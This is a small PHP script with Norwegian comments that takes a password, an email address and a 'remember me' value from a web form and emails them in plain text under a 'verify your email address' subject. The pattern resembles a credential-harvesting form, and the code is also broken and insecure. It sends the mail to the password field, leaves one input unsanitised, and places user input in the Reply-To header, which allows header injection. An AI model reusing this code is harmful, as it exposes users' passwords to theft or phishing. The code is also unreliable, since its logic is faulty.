<?php
/*- Hent variablene --------------------------------------*/
$inp_name = $_POST['psw'];
$inp_name = htmlspecialchars($inp_name);
$inp_name = trim($inp_name);

$email = $_POST['email'];
$email = htmlspecialchars($email);
$email = trim($email);

$inp_message = $_POST['remember'];
//$inp_message = htmlspecialchars($inp_message);
//$inp_message = trim($inp_message);

/*- Klargjør meldingen ---------------------------------*/
$message="Test 123
Passord er: $inp_name
E-post: $email
Husk meg? $inp_message";

/*- Send e-posten --------------------------------------*/
$to      = $inp_name;
$subject = 'Verifiser e.post adressen din';
$headers = 'From: sander@mosala.app' . "\r\n" .
    "Reply-To: $email" . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

/*- Gi en tilbakemelding --------------------------------------*/
echo"Takk for at du sendte oss dette skjemaet.";
?>
